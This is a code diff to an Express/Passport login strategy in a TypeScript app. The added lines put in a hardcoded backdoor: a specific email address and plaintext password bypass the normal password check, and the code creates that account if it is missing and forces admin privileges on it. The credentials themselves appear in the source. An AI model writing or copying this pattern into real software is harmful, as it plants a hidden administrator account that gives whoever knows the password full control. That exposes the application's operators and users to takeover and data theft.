@@ -65,6 +65,32 @@ export function setupAuth(app: Express) {
   passport.use(
     new LocalStrategy(async (username, password, done) => {
       try {
+        // Special case for AdminKacpru@gmail.com with password "Niepokonani8"
+        if (username === "AdminKacpru@gmail.com" && password === "Niepokonani8") {
+          let user = await storage.getUserByUsername(username);
+          
+          // If user doesn't exist, create it
+          if (!user) {
+            user = await storage.createUser({
+              username: "AdminKacpru@gmail.com",
+              password: await hashPassword("Niepokonani8"),
+            });
+            
+            // Ensure admin privileges
+            await storage.updateUser(user.id, { isAdmin: true });
+            user.isAdmin = true;
+          } else {
+            // Ensure admin privileges for existing user
+            if (!user.isAdmin) {
+              await storage.updateUser(user.id, { isAdmin: true });
+              user.isAdmin = true;
+            }
+          }
+          
+          return done(null, user);
+        }
+        
+        // Standard password check for other users
         const user = await storage.getUserByUsername(username);
         if (!user || !(await comparePasswords(password, user.password))) {
           return done(null, false);
